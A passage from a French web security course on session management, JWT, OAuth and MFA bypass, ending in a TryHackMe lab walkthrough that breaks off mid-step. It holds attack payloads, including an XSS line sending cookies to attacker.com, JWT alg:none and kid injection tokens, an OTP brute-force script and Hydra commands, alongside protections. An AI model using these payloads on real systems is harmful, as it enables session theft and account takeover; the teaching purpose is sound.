   - Un cookie avec `.example.com` s'applique à tous les sous-domaines
   ```
   Set-Cookie: session=abc123; Domain=.example.com
   ```

5. **Path** :
   - Limite le cookie à un chemin spécifique
   - Rarement utilisé pour la sécurité
   ```
   Set-Cookie: session=abc123; Path=/app
   ```

6. **Expires / Max-Age** :
   - Définit la durée de vie du cookie
   - Les sessions critiques devraient avoir une durée limitée
   ```
   Set-Cookie: session=abc123; Max-Age=3600
   ```

##### Analyse des cookies avec Burp Suite

Pour analyser les cookies de session :
```
1. Intercepter une requête contenant le cookie
2. Envoyer à Sequencer (clic droit > "Send to Sequencer")
3. Configurer la capture de tokens (Live capture)
4. Analyser l'entropie et la prévisibilité
```

#### Attaques sur les sessions

##### Session Fixation

L'attaque par fixation de session force la victime à utiliser un identifiant de session connu de l'attaquant :

1. L'attaquant obtient un identifiant de session valide
2. Il incite la victime à utiliser cet identifiant (via URL, XSS, etc.)
3. La victime s'authentifie avec cet identifiant
4. L'attaquant peut maintenant utiliser la session authentifiée

**Exemple d'exploitation** :
```
# 1. Obtenir un ID de session
GET /login HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
Set-Cookie: session=abc123

# 2. Forcer la victime à utiliser cet ID (via lien malveillant)
https://example.com/login?JSESSIONID=abc123

# 3. Une fois la victime authentifiée, utiliser le même ID
GET /account HTTP/1.1
Host: example.com
Cookie: session=abc123
```

**Protection** : Régénérer l'identifiant de session après l'authentification.

##### Session Hijacking

Le détournement de session consiste à voler l'identifiant de session d'un utilisateur authentifié :

1. Interception du cookie (sniffing réseau, XSS, etc.)
2. Utilisation du cookie volé pour usurper la session

**Exemple d'exploitation via XSS** :
```javascript
<script>
fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie))
</script>
```

**Protection** : Utiliser HttpOnly, Secure et SameSite=Strict.

##### Session Puzzling

Cette attaque exploite la façon dont l'application gère différents attributs de session :

1. Initialiser une session via un chemin non critique (ex: page de préférences)
2. Manipuler des attributs de session qui affectent le comportement d'authentification
3. Exploiter ces attributs lors de l'authentification

**Exemple** :
```
# 1. Accéder à une page de préférences qui définit un attribut de session
GET /preferences?lang=en HTTP/1.1
Host: example.com
# L'application stocke "lang=en" dans la session

# 2. Si l'application utilise le même mécanisme de session pour l'authentification
# et interprète mal certains attributs, on peut exploiter cette confusion
GET /preferences?role=admin HTTP/1.1
Host: example.com
# L'application stocke "role=admin" dans la session
```

**Protection** : Séparer clairement les attributs de session critiques et non critiques.

#### Implémentation sécurisée

##### Bonnes pratiques

1. **Génération d'identifiants** :
   - Utiliser des générateurs cryptographiquement sûrs
   - Longueur minimale de 128 bits (16 caractères en base64)
   - Éviter les schémas prévisibles

2. **Gestion du cycle de vie** :
   - Régénérer l'ID après authentification
   - Expiration après inactivité (15-30 minutes)
   - Expiration absolue (8-24 heures)
   - Invalidation lors de la déconnexion

3. **Stockage côté serveur** :
   - Associer les sessions à l'empreinte du navigateur
   - Stocker l'adresse IP d'origine
   - Implémenter un mécanisme de révocation

##### Exemple d'implémentation sécurisée en PHP

```php
<?php
// Configuration de session sécurisée
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
ini_set('session.gc_maxlifetime', 1800); // 30 minutes

// Démarrage de session
session_start();

// Régénération d'ID après authentification
if ($authenticated && !isset($_SESSION['authenticated'])) {
    session_regenerate_id(true);
    $_SESSION['authenticated'] = true;
    $_SESSION['auth_time'] = time();
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
}

// Vérification de validité de session
function isValidSession() {
    // Vérification de l'expiration
    if (isset($_SESSION['auth_time']) && time() - $_SESSION['auth_time'] > 1800) {
        return false; // Session expirée
    }
    
    // Vérification de l'empreinte du navigateur
    if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        return false; // Possible détournement
    }
    
    // Vérification basique de l'IP (attention aux proxys légitimes)
    if ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
        return false; // Possible détournement
    }
    
    return true;
}

// Utilisation
if (!isValidSession()) {
    // Destruction de la session
    session_unset();
    session_destroy();
    // Redirection vers la page de connexion
    header('Location: /login');
    exit;
}

// Rafraîchissement du timestamp d'activité
$_SESSION['auth_time'] = time();
?>
```

**En clair, pour un débutant :**
La gestion de session, c'est comme un système de bracelets dans un parc d'attractions. Quand vous payez l'entrée (authentification), on vous donne un bracelet unique (cookie de session). Ce bracelet vous permet d'accéder aux attractions sans repayer à chaque fois. Les flags de sécurité sont comme des caractéristiques spéciales de ce bracelet : HttpOnly le rend invisible aux appareils photo (JavaScript), Secure fait qu'il ne fonctionne que dans certaines zones sécurisées, et SameSite empêche qu'on vous pousse à l'utiliser dans un autre parc. Les attaques visent soit à vous donner un bracelet piégé (fixation), soit à copier votre bracelet (hijacking), soit à exploiter des confusions dans le système de contrôle (puzzling).

### JWT Security

Les JSON Web Tokens (JWT) sont devenus un standard pour l'authentification et l'autorisation dans les API modernes, mais ils présentent des vulnérabilités spécifiques.

#### Structure d'un JWT

Un JWT se compose de trois parties séparées par des points :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

1. **Header** (en-tête) : Spécifie l'algorithme et le type de token
   ```json
   {
     "alg": "HS256",
     "typ": "JWT"
   }
   ```

2. **Payload** (charge utile) : Contient les revendications (claims)
   ```json
   {
     "sub": "1234567890",
     "name": "John Doe",
     "admin": false,
     "iat": 1516239022
   }
   ```

3. **Signature** : Garantit l'intégrité du token
   ```
   HMACSHA256(
     base64UrlEncode(header) + "." +
     base64UrlEncode(payload),
     secret
   )
   ```

#### Vulnérabilités et attaques

##### Attaque "alg: none"

Cette attaque exploite la possibilité de spécifier qu'aucun algorithme n'est utilisé pour la signature :

1. Décoder le JWT
2. Modifier le header pour définir `"alg": "none"`
3. Modifier le payload selon les besoins (ex: `"admin": true`)
4. Supprimer la signature (laisser un troisième segment vide)
5. Reconstruire le token

**Exemple d'exploitation** :
```
# JWT original
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.1234signature

# JWT modifié
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.
```

**Protection** : Rejeter explicitement les tokens utilisant l'algorithme "none".

##### Confusion d'algorithme (algorithm confusion)

Cette attaque exploite la confusion entre algorithmes symétriques (HS256) et asymétriques (RS256) :

1. L'application utilise RS256 (clé publique/privée)
2. L'attaquant récupère la clé publique (souvent disponible)
3. L'attaquant modifie l'algorithme de RS256 à HS256
4. L'application utilise alors la clé publique comme clé secrète pour HS256

**Exemple d'exploitation** :
```
# JWT original (RS256)
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.signature

# JWT modifié (HS256 avec clé publique)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.new_signature
```

**Protection** : Valider strictement l'algorithme attendu.

##### Injection de paramètre "kid" (Key ID)

Le paramètre "kid" (Key ID) dans l'en-tête indique quelle clé utiliser pour vérifier la signature :

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1"
}
```

Cette fonctionnalité peut être exploitée de plusieurs façons :

1. **Injection de chemin de fichier** :
   ```json
   {
     "alg": "HS256",
     "kid": "../../../etc/passwd"
   }
   ```
   Si l'application utilise le contenu du fichier référencé comme clé, elle utilisera le contenu de /etc/passwd.

2. **Injection SQL** :
   ```json
   {
     "alg": "HS256",
     "kid": "key1' UNION SELECT 'attacker_controlled_key"
   }
   ```

3. **Utilisation d'une clé connue** :
   ```json
   {
     "alg": "HS256",
     "kid": "000000"
   }
   ```
   Utilisation d'une clé nulle ou prévisible (ex: chaîne de zéros).

**Protection** : Valider strictement le format du kid et utiliser une table de correspondance plutôt qu'une construction dynamique.

##### Attaques par force brute sur la clé secrète

Si la clé secrète est faible, elle peut être découverte par force brute :

```bash
# Utilisation de jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" "abcdefghijklmnopqrstuvwxyz" 6

# Utilisation de hashcat
hashcat -m 16500 -a 3 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" ?a?a?a?a?a?a
```

**Protection** : Utiliser des clés secrètes fortes (au moins 256 bits d'entropie).

#### Outils d'analyse et d'exploitation

##### JWT_Tool

JWT_Tool est un outil polyvalent pour tester la sécurité des JWT :

```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py

# Mode d'audit
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -M all

# Attaque "none"
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -X a

# Injection kid
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -I -hc kid -hv "../../dev/null"
```

##### Burp Suite JWT Editor

L'extension JWT Editor pour Burp Suite permet d'analyser et de manipuler facilement les JWT :

1. Installation via le BApp Store
2. Fonctionnalités principales :
   - Décodage automatique des JWT
   - Modification du header et du payload
   - Signature avec différentes clés et algorithmes
   - Attaques automatisées

#### Implémentation sécurisée

##### Bonnes pratiques

1. **Validation stricte** :
   - Vérifier l'algorithme attendu
   - Valider tous les champs obligatoires
   - Vérifier l'émetteur (iss) et l'audience (aud)

2. **Gestion des clés** :
   - Utiliser des clés fortes (min. 256 bits pour HMAC)
   - Rotation régulière des clés
   - Stockage sécurisé des clés

3. **Durée de vie limitée** :
   - Utiliser les champs d'expiration (exp)
   - Durée courte pour les tokens d'accès (15-60 minutes)
   - Implémenter un mécanisme de révocation

4. **Contenu minimal** :
   - Ne pas stocker de données sensibles
   - Limiter les informations au strict nécessaire

##### Exemple d'implémentation sécurisée en Node.js

```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Génération d'une clé secrète forte
const secretKey = crypto.randomBytes(64).toString('hex');

// Création d'un token
function createToken(user) {
  const payload = {
    sub: user.id,
    name: user.name,
    role: user.role,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (60 * 15), // 15 minutes
    iss: 'https://api.example.com',
    aud: 'https://example.com'
  };
  
  const options = {
    algorithm: 'HS256' // Spécifier explicitement l'algorithme
  };
  
  return jwt.sign(payload, secretKey, options);
}

// Vérification d'un token
function verifyToken(token) {
  try {
    const options = {
      algorithms: ['HS256'], // Restreindre aux algorithmes acceptés
      issuer: 'https://api.example.com',
      audience: 'https://example.com'
    };
    
    const decoded = jwt.verify(token, secretKey, options);
    
    // Vérifications supplémentaires
    if (decoded.role && !isValidRole(decoded.role)) {
      throw new Error('Invalid role');
    }
    
    return decoded;
  } catch (err) {
    console.error('Token verification failed:', err.message);
    return null;
  }
}
```

**En clair, pour un débutant :**
Un JWT est comme un badge d'accès numérique composé de trois parties : l'en-tête qui indique le type de badge, le contenu qui contient vos informations, et la signature qui prouve que le badge est authentique. Les attaques sur les JWT consistent principalement à falsifier cette signature ou à exploiter des faiblesses dans la vérification. L'attaque "alg: none" revient à dire "pas besoin de vérifier ma signature", la confusion d'algorithme utilise la mauvaise clé pour vérifier, et l'injection "kid" manipule l'identifiant de la clé utilisée. C'est comme si vous trouviez des failles dans le système de vérification des badges pour accéder à des zones normalement restreintes.

### OAuth Vulnerabilities

OAuth 2.0 est un protocole d'autorisation largement utilisé qui permet à des applications tierces d'accéder à des ressources sans exposer les identifiants de l'utilisateur. Malgré sa popularité, il présente plusieurs vulnérabilités potentielles.

#### Fonctionnement d'OAuth 2.0

##### Flux d'autorisation (Authorization Code Flow)

1. L'utilisateur accède à l'application cliente
2. L'application redirige vers le serveur d'autorisation
3. L'utilisateur s'authentifie et autorise l'accès
4. Le serveur d'autorisation redirige vers l'application avec un code d'autorisation
5. L'application échange ce code contre un token d'accès
6. L'application utilise ce token pour accéder aux ressources

```
┌─────────┐     1. Demande d'autorisation     ┌─────────────────┐
│         │─────────────────────────────────> │                 │
│ Client  │                                    │ Serveur         │
│         │ <─────────────────────────────────│ d'autorisation  │
└─────────┘     2. Code d'autorisation        └─────────────────┘
     │                                                  ▲
     │ 3. Échange code                                  │
     │    contre token                                  │
     ▼                                                  │
┌─────────┐                                    ┌─────────────────┐
│ Serveur │            4. Token                │                 │
│ de      │ <─────────────────────────────────│ Utilisateur     │
│ ressour.│                                    │                 │
└─────────┘                                    └─────────────────┘
```

##### Flux implicite (Implicit Flow)

Dans ce flux simplifié, le token d'accès est directement retourné au client :

1. L'utilisateur accède à l'application cliente
2. L'application redirige vers le serveur d'autorisation
3. L'utilisateur s'authentifie et autorise l'accès
4. Le serveur d'autorisation redirige directement vers l'application avec un token d'accès dans l'URL

#### Vulnérabilités courantes

##### Fuite de token dans le flux implicite

Le flux implicite expose le token d'accès dans l'URL, ce qui présente plusieurs risques :

1. **Exposition dans l'historique du navigateur**
2. **Exposition dans les logs du serveur**
3. **Fuite via le header Referer**

**Exemple d'exploitation** :
```
# URL de redirection avec token exposé
https://client-app.com/callback#access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&token_type=bearer&expires_in=3600

# Si l'application charge des ressources externes, le token peut fuiter via Referer
GET /image.png HTTP/1.1
Host: evil-tracker.com
Referer: https://client-app.com/callback#access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Protection** : Utiliser le flux d'autorisation avec PKCE plutôt que le flux implicite.

##### CSRF sur la redirection d'autorisation

Si l'état (paramètre `state`) n'est pas correctement implémenté, une attaque CSRF peut forcer l'utilisateur à autoriser une application malveillante :

**Exemple d'exploitation** :
```html
<!-- Page malveillante -->
<img src="https://oauth-provider.com/authorize?client_id=legitimate-app&redirect_uri=https://attacker.com&response_type=token&scope=email" style="display:none">
```

**Protection** : Utiliser un paramètre `state` aléatoire et le valider.

##### Redirection URI non validée

Si le serveur d'autorisation ne valide pas strictement l'URI de redirection, un attaquant peut détourner le flux :

**Exemple d'exploitation** :
```
# URI de redirection légitime
https://oauth-provider.com/authorize?client_id=123&redirect_uri=https://legitimate-app.com/callback

# URI de redirection malveillante
https://oauth-provider.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback
```

Variantes d'exploitation :
- Sous-domaines : `redirect_uri=https://attacker.legitimate-app.com`
- Chemins relatifs : `redirect_uri=https://legitimate-app.com/../../attacker`
- Validation laxiste : `redirect_uri=https://legitimate-app.com.attacker.com`

**Protection** : Valider strictement les URIs de redirection contre une liste blanche.

##### Interception de code d'autorisation

Le code d'autorisation peut être intercepté si :
- Il est transmis via HTTP non sécurisé
- L'application est vulnérable au XSS
- L'utilisateur est victime de phishing

**Protection** : Utiliser HTTPS, implémenter PKCE, limiter la durée de vie des codes.

##### Réutilisation de code d'autorisation

Si un code d'autorisation peut être utilisé plusieurs fois, un attaquant qui l'intercepte peut l'échanger contre un token valide :

**Exemple d'exploitation** :
```
# Requête légitime
POST /token HTTP/1.1
Host: oauth-provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://legitimate-app.com/callback&client_id=123&client_secret=SECRET
```

**Protection** : Invalider les codes après leur utilisation.

#### Outils d'analyse et d'exploitation

##### OWASP ZAP OAuth Addon

L'extension OAuth pour OWASP ZAP permet d'analyser et de tester les implémentations OAuth :

```
1. Installer l'extension depuis le marketplace ZAP
2. Configurer les paramètres OAuth (endpoints, client_id, etc.)
3. Utiliser les fonctionnalités de test automatisé
```

##### Burp OAuth Scanner

Cette extension pour Burp Suite automatise la détection de vulnérabilités OAuth :

```
1. Installer via le BApp Store
2. Configurer les paramètres de l'application OAuth
3. Lancer un scan ciblé sur les endpoints OAuth
```

#### Implémentation sécurisée

##### Recommandations pour les serveurs d'autorisation

1. **Validation stricte des redirect_uri**
   - Correspondance exacte avec les URIs pré-enregistrées
   - Pas de validation partielle ou de wildcards

2. **Sécurisation des tokens**
   - Durée de vie courte pour les tokens d'accès
   - Utilisation de tokens opaques ou de JWTs signés
   - Validation de l'audience (aud) et de l'émetteur (iss)

3. **Protection contre les attaques par force brute**
   - Limitation du taux de requêtes
   - Codes d'autorisation à usage unique
   - Expiration rapide des codes non utilisés (max 10 minutes)

##### Recommandations pour les clients OAuth

1. **Utilisation du flux d'autorisation avec PKCE**
   ```
   # Génération du code_verifier et code_challenge
   code_verifier = random_string(128)
   code_challenge = base64url_encode(SHA256(code_verifier))
   
   # Requête d'autorisation
   https://oauth-provider.com/authorize?client_id=123&redirect_uri=https://app.com/callback&response_type=code&code_challenge=CHALLENGE&code_challenge_method=S256
   
   # Échange du code
   POST /token HTTP/1.1
   Host: oauth-provider.com
   Content-Type: application/x-www-form-urlencoded
   
   grant_type=authorization_code&code=CODE&redirect_uri=https://app.com/callback&client_id=123&code_verifier=VERIFIER
   ```

2. **Utilisation et validation du paramètre state**
   ```javascript
   // Génération d'un state aléatoire
   const state = crypto.randomBytes(32).toString('hex');
   // Stockage dans la session
   session.oauth_state = state;
   
   // URL d'autorisation
   const authUrl = `https://oauth-provider.com/authorize?client_id=123&redirect_uri=https://app.com/callback&response_type=code&state=${state}`;
   
   // Validation lors du callback
   if (req.query.state !== session.oauth_state) {
     return res.status(403).send('Invalid state parameter');
   }
   ```

3. **Stockage sécurisé des secrets**
   - Ne jamais exposer client_secret côté client
   - Utiliser un backend proxy pour les applications SPA
   - Stocker les tokens dans des cookies HttpOnly

**En clair, pour un débutant :**
OAuth est comme un service de voiturier pour l'authentification. Au lieu de donner vos clés de voiture (mot de passe) à chaque application, vous les confiez uniquement au voiturier de confiance (serveur d'autorisation), qui donne ensuite un ticket spécial (token) à l'application. Les vulnérabilités surviennent quand ce système de tickets n'est pas bien sécurisé : le flux implicite expose le ticket en pleine vue, l'absence de paramètre "state" permet à quelqu'un de vous faire autoriser une application sans votre consentement, et une validation laxiste des URIs de redirection peut envoyer votre ticket à un imposteur plutôt qu'à l'application légitime.

### Multi-Factor Auth bypass

L'authentification multi-facteurs (MFA) ajoute une couche de sécurité supplémentaire, mais peut présenter des vulnérabilités exploitables.

#### Types d'authentification multi-facteurs

1. **Quelque chose que vous savez** : Mot de passe, PIN, réponse à une question
2. **Quelque chose que vous possédez** : Téléphone mobile, token physique, carte à puce
3. **Quelque chose que vous êtes** : Empreinte digitale, reconnaissance faciale, scan rétinien

Les implémentations courantes incluent :
- **TOTP** (Time-based One-Time Password) : Google Authenticator, Authy
- **HOTP** (HMAC-based One-Time Password) : YubiKey en mode HOTP
- **SMS/Email OTP** : Codes envoyés par SMS ou email
- **Push Notifications** : Duo Security, Okta Verify
- **WebAuthn/FIDO2** : YubiKey, Windows Hello, Touch ID

#### Vulnérabilités et techniques de bypass

##### Réutilisation de codes OTP

Si l'application n'invalide pas les codes OTP après utilisation, ils peuvent être réutilisés :

**Exemple d'exploitation** :
```
# Intercepter un code OTP valide avec Burp Suite
POST /verify-otp HTTP/1.1
Host: example.com
Content-Type: application/json

{"otp":"123456"}

# Réutiliser ce code ultérieurement
```

**Test** : Essayer de soumettre le même code OTP plusieurs fois.

**Protection** : Invalider les codes après utilisation, implémenter des compteurs côté serveur.

##### Absence de limitation de tentatives

Sans limitation du nombre de tentatives, un attaquant peut bruteforcer les codes OTP :

**Exemple d'exploitation** :
```python
# Script de bruteforce pour un code à 6 chiffres
import requests

url = "https://example.com/verify-otp"
session_cookie = "session=abc123"

for code in range(0, 1000000):
    otp = f"{code:06d}"  # Format avec leading zeros
    response = requests.post(
        url,
        json={"otp": otp},
        headers={"Cookie": session_cookie}
    )
    
    if "success" in response.text:
        print(f"Code valide trouvé : {otp}")
        break
```

**Protection** : Limiter le nombre de tentatives, implémenter des délais croissants.

##### Contournement du flux MFA

Certaines applications implémentent mal le flux MFA, permettant de le contourner complètement :

1. **Accès direct aux pages protégées** :
   ```
   # Après authentification par mot de passe mais avant MFA
   GET /dashboard HTTP/1.1
   Cookie: session=abc123
   ```

2. **Paramètres de requête manipulables** :
   ```
   # URL normale
   https://example.com/login?mfa=required
   
   # URL manipulée
   https://example.com/login?mfa=false
   https://example.com/login?mfa=0
   https://example.com/login?skip_mfa=true
   ```

3. **Manipulation de cookies ou de variables de session** :
   ```
   # Cookie original
   Cookie: session=abc123; mfa_required=true
   
   # Cookie manipulé
   Cookie: session=abc123; mfa_required=false
   ```

**Protection** : Vérifier l'état MFA côté serveur, ne pas se fier aux paramètres clients.

##### Race conditions

Dans certains cas, une race condition peut permettre de contourner la vérification MFA :

**Exemple d'exploitation** :
```
# Envoyer simultanément plusieurs requêtes vers la page protégée
# avant que le statut MFA ne soit correctement enregistré
```

**Protection** : Implémenter des verrous de session, vérifier systématiquement le statut MFA.

##### Bypass via canaux alternatifs

Si l'application propose plusieurs méthodes d'authentification, les canaux alternatifs peuvent être plus vulnérables :

1. **Reset de mot de passe sans MFA**
2. **API alternatives sans MFA**
3. **Applications mobiles avec vérification MFA différente**

**Exemple d'exploitation** :
```
# Si la réinitialisation de mot de passe ne requiert pas de MFA
POST /reset-password HTTP/1.1
Host: example.com
Content-Type: application/json

{"email":"victim@example.com"}
```

**Protection** : Appliquer le MFA de manière cohérente sur tous les canaux.

#### Attaques spécifiques par type de MFA

##### SMS/Email OTP

1. **SIM Swapping** : L'attaquant convainc l'opérateur téléphonique de transférer le numéro de la victime vers une nouvelle carte SIM
2. **Interception de SMS** : Via des vulnérabilités SS7 ou des malwares sur le téléphone
3. **Phishing en temps réel** : L'attaquant crée un site de phishing qui transmet les OTP en temps réel

**Protection** : Privilégier les applications TOTP plutôt que les SMS.

##### TOTP (Google Authenticator, Authy)

1. **Phishing de la seed** : Lors de la configuration initiale, l'attaquant capture le QR code ou la clé secrète
2. **Manipulation de l'horloge** : Exploiter des problèmes de synchronisation temporelle
3. **Extraction de la seed** : Sur des appareils compromis ou via des sauvegardes non chiffrées

**Protection** : Utiliser des appareils dédiés, chiffrer les sauvegardes.

##### Push Notifications

1. **Fatigue d'authentification** : Bombarder l'utilisateur de notifications jusqu'à ce qu'il accepte par erreur
2. **Phishing contextuel** : Créer un contexte trompeur qui incite l'utilisateur à accepter la notification

**Protection** : Inclure des informations contextuelles dans les notifications, limiter la fréquence.

#### Outils et techniques de test

##### Burp Suite Extensions

1. **Autorize** : Tester si les endpoints respectent les exigences MFA
2. **Turbo Intruder** : Pour les attaques par force brute à haute vitesse
3. **AuthMatrix** : Cartographier et tester les contrôles d'accès

##### Scripts personnalisés

```python
# Script pour tester la réutilisation d'OTP
import requests

url = "https://example.com/verify-otp"
session_cookie = "session=abc123"
valid_otp = "123456"  # OTP valide précédemment capturé

# Première utilisation
response1 = requests.post(
    url,
    json={"otp": valid_otp},
    headers={"Cookie": session_cookie}
)

print(f"Première tentative: {response1.status_code} - {response1.text}")

# Tentative de réutilisation
response2 = requests.post(
    url,
    json={"otp": valid_otp},
    headers={"Cookie": session_cookie}
)

print(f"Seconde tentative: {response2.status_code} - {response2.text}")
```

#### Implémentation sécurisée

##### Bonnes pratiques

1. **Validation côté serveur** :
   - Vérifier systématiquement le statut MFA avant d'accorder l'accès
   - Ne jamais se fier aux paramètres contrôlés par le client

2. **Gestion des sessions** :
   - Utiliser des flags de session pour suivre l'état MFA
   - Régénérer les identifiants de session après chaque étape

3. **Sécurisation des codes** :
   - Codes à usage unique
   - Expiration courte (30-120 secondes)
   - Limitation du nombre de tentatives

4. **Alternatives de secours** :
   - Codes de secours pré-générés
   - Processus de récupération sécurisé
   - Vérification d'identité hors bande

##### Exemple d'implémentation en Python (Flask)

```python
from flask import Flask, request, session, redirect
import pyotp
import time
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Base de données simulée
users_db = {
    "alice": {
        "password": "hashed_password_here",
        "totp_secret": "BASE32SECRET",
        "failed_attempts": 0,
        "last_attempt": 0
    }
}

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username in users_db and verify_password(password, users_db[username]['password']):
        # Authentification réussie, mais MFA requis
        session['user'] = username
        session['authenticated'] = False  # Pas encore complètement authentifié
        session['mfa_required'] = True
        session['login_time'] = time.time()
        
        return redirect('/verify-mfa')
    
    return "Identifiants invalides", 401

@app.route('/verify-mfa', methods=['GET', 'POST'])
def verify_mfa():
    if 'user' not in session:
        return redirect('/login')
    
    if request.method == 'GET':
        return "Entrez votre code MFA"
    
    # Vérification du délai depuis la dernière tentative
    user = users_db[session['user']]
    current_time = time.time()
    if current_time - user['last_attempt'] < get_backoff_time(user['failed_attempts']):
        return "Trop de tentatives, veuillez réessayer plus tard", 429
    
    user['last_attempt'] = current_time
    
    # Vérification du code OTP
    otp = request.form.get('otp')
    totp = pyotp.TOTP(user['totp_secret'])
    
    if totp.verify(otp):
        # Réinitialisation des tentatives échouées
        user['failed_attempts'] = 0
        
        # Authentification complète
        session.pop('mfa_required', None)
        session['authenticated'] = True
        session['mfa_time'] = time.time()
        
        # Régénération de l'ID de session
        old_session = dict(session)
        session.clear()
        session.update(old_session)
        
        return redirect('/dashboard')
    else:
        # Incrémenter le compteur d'échecs
        user['failed_attempts'] += 1
        return "Code MFA invalide", 401

@app.route('/dashboard')
def dashboard():
    # Vérification complète de l'authentification
    if not session.get('authenticated', False):
        return redirect('/login')
    
    # Vérification de l'expiration de session
    if time.time() - session.get('mfa_time', 0) > 3600:  # 1 heure
        session.clear()
        return redirect('/login')
    
    return f"Tableau de bord pour {session['user']}"

def get_backoff_time(failed_attempts):
    # Délai exponentiel: 0, 2, 4, 8, 16... secondes
    if failed_attempts == 0:
        return 0
    return min(2 ** (failed_attempts - 1), 300)  # Max 5 minutes

def verify_password(plain_password, hashed_password):
    # Implémentation réelle utiliserait bcrypt ou similar
    return plain_password == "correct_password"

if __name__ == '__main__':
    app.run(debug=True)
```

**En clair, pour un débutant :**
L'authentification multi-facteurs, c'est comme avoir plusieurs serrures sur votre porte d'entrée : une clé traditionnelle (mot de passe) et une clé électronique temporaire (code OTP). Les techniques de bypass cherchent à contourner cette protection, soit en réutilisant une clé temporaire qui devrait être à usage unique, soit en essayant toutes les combinaisons possibles, soit en trouvant une porte dérobée non protégée, soit en exploitant des failles dans le système de vérification. C'est comme si vous trouviez un moyen d'entrer dans la maison sans avoir toutes les clés requises, en exploitant des négligences dans la conception du système de sécurité.

### Mini-lab THM « Hammer »

Ce mini-lab vous guide à travers l'exploitation de diverses vulnérabilités d'authentification sur une machine TryHackMe.

#### Objectif

Exploiter différentes faiblesses dans les mécanismes d'authentification pour obtenir un accès non autorisé et récupérer des flags.

#### Préparation

1. **Accès à la machine** :
   - Connectez-vous à TryHackMe
   - Déployez la machine "Hammer"
   - Notez l'adresse IP attribuée

2. **Configuration de l'environnement** :
   - Préparez Burp Suite pour l'interception
   - Créez des répertoires pour organiser vos notes et résultats

#### Reconnaissance initiale

1. **Scan de ports** :
   ```bash
   nmap -sC -sV -p- MACHINE_IP
   ```

2. **Énumération web** :
   ```bash
   gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
   ```

3. **Analyse manuelle** :
   - Explorez l'application web
   - Identifiez les points d'authentification
   - Notez les fonctionnalités et comportements

#### Partie 1 : Énumération d'utilisateurs

1. **Identification du vecteur** :
   - Localisez le formulaire de connexion principal
   - Testez différents noms d'utilisateurs et mots de passe
   - Observez les différences dans les messages d'erreur

2. **Exploitation** :
   ```bash
   # Utilisation de Hydra pour l'énumération d'utilisateurs
   hydra -L userlist.txt -p test MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username"
   ```

3. **Analyse des résultats** :
   - Créez une liste des utilisateurs valides
   - Documentez la méthode d'énumération
   - Expliquez pourquoi cette vulnérabilité existe

#### Partie 2 : Attaque par force brute

1. **Configuration de l'attaque** :
   - Utilisez les noms d'utilisateurs découverts
   - Préparez une liste de mots de passe (rockyou.txt ou similaire)

2. **Exploitation** :
   ```bash
   # Attaque par force brute avec Hydra
